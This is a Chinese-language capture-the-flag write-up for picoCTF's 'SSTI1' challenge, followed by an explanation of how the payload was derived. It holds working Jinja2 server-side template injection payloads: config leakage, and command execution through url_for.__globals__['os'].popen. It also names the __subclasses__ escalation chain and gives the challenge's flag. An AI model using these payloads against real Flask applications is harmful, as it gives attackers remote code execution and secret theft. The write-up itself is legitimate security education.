# SSTI1 - Writeup

## 题目信息

* **题目名称**：SSTI1
* **题目类型**：Web Exploitation
* **核心考点**：

  * Server-Side Template Injection（SSTI）
  * Flask + Jinja2 模板引擎
  * Burp Suite 抓包与重放
  * Python 对象访问
  * 命令执行（RCE）

---

# 题目描述

题目提供了一个简单的网站，可以输入内容进行“公告”。

页面提示：

```
I built a cool website that lets you announce whatever you want!
```

页面中存在一个输入框：

```html
<form action="/" method="POST">
<input name="content">
</form>
```

输入的内容会被服务器接收并渲染到页面上。

题目标题为 **SSTI1**，并且提示 **Server Side Template Injection**，说明这题很可能与 **服务器端模板注入漏洞**有关。

---

# 解题思路

这题的基本流程为：

1. 找到用户可控输入
2. 使用 Burp Suite 抓取 POST 请求
3. 测试是否存在 SSTI
4. 判断模板引擎类型
5. 利用模板注入执行系统命令
6. 读取服务器上的 flag 文件

---

# 第一步：定位可控参数

使用 **Burp Suite** 抓取请求。

提交一次输入：

```
test
```

抓到请求：

```http
POST / HTTP/1.1
Host: rescued-float.picoctf.net
Content-Type: application/x-www-form-urlencoded

content=test
```

说明：

```
content 参数完全由用户控制
```

服务器随后返回：

```
307 Redirect
Location: /announce
```

说明：

```
POST / 提交内容
GET /announce 显示结果
```

---

# 第二步：测试是否存在 SSTI

SSTI 的经典检测 payload 是：

```
{{7*7}}
```

修改请求：

```http
content={{7*7}}
```

服务器返回：

```
49
```

说明：

```
模板表达式被服务器执行
```

因此可以确认：

```
存在 SSTI 漏洞
```

---

# 第三步：识别模板引擎

继续测试 payload：

```
{{config}}
```

服务器返回：

```
Flask config
SECRET_KEY
DEBUG
```

说明：

```
后端框架为 Flask
模板引擎为 Jinja2
```

这是 Python Web 应用中非常常见的组合。

---

# 第四步：尝试命令执行

Flask 中存在一个全局函数：

```
url_for
```

Python 函数有一个属性：

```
__globals__
```

可以访问函数所在模块的 **全局变量**。

其中包括：

```
os
sys
builtins
```

因此可以构造 payload：

```
{{url_for.__globals__['os'].popen('ls').read()}}
```

发送请求后服务器返回：

```
__pycache__
app.py
flag
requirements.txt
```

说明：

```
成功执行系统命令
```

---

# 第五步：读取 flag

既然可以执行系统命令，就可以直接读取 flag 文件：

```
{{url_for.__globals__['os'].popen('cat flag').read()}}
```

服务器返回：

```
picoCTF{s4rv3r_s1d3_t3mpl4t3_1nj3ct10n5_4r3_c001_bcf73b04}
```

成功获取 flag。

---

# 最终答案

```
picoCTF{s4rv3r_s1d3_t3mpl4t3_1nj3ct10n5_4r3_c001_bcf73b04}
```

---

# 这题学到了什么

这题是一个非常典型的 **Jinja2 SSTI 入门题**，主要训练以下技能：

### 1. 使用 Burp 抓取和修改请求

通过 Burp 可以修改 HTTP 请求中的参数，例如：

```
content=
```

这是 Web CTF 中最基础也是最重要的技能之一。

---

### 2. 学会识别 SSTI

SSTI 的经典检测 payload：

```
{{7*7}}
```

如果返回：

```
49
```

说明：

```
模板表达式被执行
```

---

### 3. 识别 Flask + Jinja2 环境

通过 payload：

```
{{config}}
```

返回：

```
SECRET_KEY
DEBUG
```

可以判断：

```
Flask + Jinja2
```

---

### 4. 利用 Python 对象访问

关键利用链：

```
url_for
↓
__globals__
↓
os
↓
popen()
```

最终实现：

```
命令执行
```

---

# 可写进笔记的 payload 总结

```text
{{7*7}}

{{config}}

{{url_for.__globals__['os'].popen('ls').read()}}

{{url_for.__globals__['os'].popen('cat flag').read()}}
```

---

# 一句话总结

本题通过 **Burp 抓取 POST 请求中的 content 参数**，利用 **Jinja2 模板注入（SSTI）** 执行 Python 表达式，通过 `url_for.__globals__` 获取 `os` 模块并执行系统命令，最终读取 `flag` 文件得到：

```
picoCTF{s4rv3r_s1d3_t3mpl4t3_1nj3ct10n5_4r3_c001_bcf73b04}
```








# NEW 一、payload推导：先理解模板在执行什么

在 Jinja2 模板里：

```
{{ ... }}
```

里面其实就是 **Python 表达式**。

例如：

```
{{7*7}}
```

服务器执行的其实就是：

```python
7*7
```

所以返回：

```
49
```

说明一件事：

> **我们已经可以执行 Python 表达式**

但现在问题是：

```
怎么从 Python 表达式 → 执行系统命令？
```

---

# 二、Python 执行系统命令的方法

在 Python 里执行系统命令最常见的是：

```python
import os
os.popen("ls").read()
```

或者

```python
os.system("ls")
```

所以我们的目标就是：

```
在模板里找到 os
```

也就是：

```
{{ os.popen("ls").read() }}
```

但问题来了：

```
模板里没有 os 变量
```

所以我们需要 **想办法拿到 os 对象**。

---

# 三、Flask 模板里有哪些对象？

Flask 的 Jinja2 模板会自动暴露一些变量，例如：

```
config
request
session
url_for
g
```

这些对象可以直接访问：

例如：

```
{{config}}
```

你之前就试过：

```
{{config}}
```

返回：

```
SECRET_KEY
DEBUG
```

说明：

```
Flask对象可以访问
```

---

# 四、为什么选择 url_for？

因为：

```
url_for 是 Flask 的函数
```

Python 里的 **函数有一个特殊属性**：

```
__globals__
```

这个属性指向：

```
函数所在模块的全局变量
```

举个例子：

```python
def test():
    pass

print(test.__globals__)
```

里面会包含：

```
os
sys
builtins
```

所以：

```
url_for.__globals__
```

其实就是：

```
Flask模块里的所有全局变量
```

---

# 五、查看 globals 里有什么

我们可以在模板里试：

```
{{url_for.__globals__}}
```

会返回一大堆东西，例如：

```
os
sys
werkzeug
json
...
```

说明：

```
os 在 globals 里面
```

---

# 六、取出 os

Python 字典访问：

```python
dict["key"]
```

所以：

```
url_for.__globals__['os']
```

就等于：

```
os
```

---

# 七、执行命令

Python 执行命令：

```python
os.popen("ls").read()
```

解释一下：

| 代码        | 作用     |
| --------- | ------ |
| `popen()` | 执行系统命令 |
| `ls`      | 列出文件   |
| `read()`  | 读取输出   |

---

# 八、把所有东西拼起来

我们已经有：

```
url_for.__globals__['os']
```

再执行：

```
popen("ls").read()
```

组合：

```
url_for.__globals__['os'].popen("ls").read()
```

再放进模板：

```
{{url_for.__globals__['os'].popen("ls").read()}}
```

于是服务器执行：

```python
os.popen("ls").read()
```

返回：

```
__pycache__
app.py
flag
requirements.txt
```

---

# 九、读取 flag

既然可以执行命令：

```
ls
```

那就可以：

```
cat flag
```

所以：

```
{{url_for.__globals__['os'].popen('cat flag').read()}}
```

---

# 十、整条利用链

你可以这样记：

```
SSTI
 ↓
Python表达式执行
 ↓
Flask对象
 ↓
url_for
 ↓
__globals__
 ↓
os
 ↓
popen()
 ↓
系统命令
```

---

# 十一、你需要学习哪些知识

这条 payload其实涉及 **3个知识点**：

### 1️⃣ Jinja2 模板语法

核心：

```
{{ expression }}
```

---

### 2️⃣ Flask 模板变量

常见：

```
config
request
session
url_for
```

---

### 3️⃣ Python 对象模型

关键知识：

```
函数.__globals__
```

---

# 十二、一个更重要的现实

其实很多 CTF 选手 **并不是自己发明 payload**。

而是：

看到：

```
Flask
Werkzeug
Jinja2
```

就立刻想到：

```
url_for.__globals__
```

这是 **经验 payload**。

---

# 十三、真正高手用的是另一条链

有些题会 **禁止 url_for**。

这时候就要用：

```
__class__
__mro__
__subclasses__()
```

例如：

```
{{''.__class__.__mro__[1].__subclasses__()}}
```

这就是 **SSTI高级利用链**。